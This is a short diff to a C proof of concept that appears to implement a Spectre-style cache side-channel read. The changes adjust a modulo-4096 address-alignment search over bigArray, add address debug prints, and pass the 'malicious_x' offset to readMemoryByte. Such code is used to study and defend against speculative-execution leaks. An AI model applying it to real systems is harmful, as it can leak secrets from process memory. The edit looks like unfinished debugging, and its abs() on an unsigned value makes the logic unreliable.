@@ -156,17 +156,23 @@ int main(int argc, const char * * argv) {
   //Find the address that corresponds to secret[0] in terms of its modulu
   for (i = 0; i < sizeof(bigArray); i++) {
       addr = &bigArray[i];
-      distanceFromCurrentAddressToDesiredAddress = (size_t)(secret - (char*)addr);
+      distanceFromCurrentAddressToDesiredAddress = (size_t)(secret - addr);
+      distanceFromCurrentAddressToDesiredAddress = abs(distanceFromCurrentAddressToDesiredAddress);
+
       if (distanceFromCurrentAddressToDesiredAddress % 4096 == 0) {
           distanceFromCurrentAddressToDesiredAddress = i; //This is the location that we need in bigArray
           break;
       }
   }
-  bigArray[distanceFromCurrentAddressToDesiredAddress] = 'A';
+  bigArray[distanceFromCurrentAddressToDesiredAddress] = 'N';
+
   printf("Malicious x is %zu", distanceFromCurrentAddressToDesiredAddress);
+  printf("Address in bigArray is %p", addr);
+  printf("Address of the secret is %p", secret);
   while (--len >= 0) {
     printf("\n");
-    printf("Reading at malicious_x = %p... ", (void*)distanceFromCurrentAddressToDesiredAddress);
+    //printf("Reading at malicious_x = %p... \n", (void*)distanceFromCurrentAddressToDesiredAddress);
+
 
     readMemoryByte(distanceFromCurrentAddressToDesiredAddress, value, score);
 
